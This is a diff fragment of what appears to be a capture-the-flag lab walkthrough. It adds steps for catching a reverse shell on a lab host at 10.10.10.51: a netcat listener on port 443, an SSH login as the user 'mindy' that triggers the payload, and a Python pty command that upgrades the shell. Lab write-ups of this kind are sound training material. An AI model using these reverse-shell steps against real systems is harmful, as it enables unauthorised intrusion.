@@ -248,7 +248,13 @@ Connection closed by foreign host.
   - Start a `netcat` listener on port `443`.
   - Trigger the email to receive a reverse shell by logging in to a user's account.
 ```CSS
+▶ nc -nlvvp 443
+```
+```CSS
 ▶ ssh mindy@10.10.10.51
 ```
 ![image](https://user-images.githubusercontent.com/83878909/236788352-ac229063-99f1-485d-9a3a-497000484b32.png)
-
+```CSS
+python -c 'import pty;pty.spawn("bash")'
+```
+![image](https://user-images.githubusercontent.com/83878909/236799653-fee561fc-2ee1-438c-9a1e-b8cf46ba419c.png)
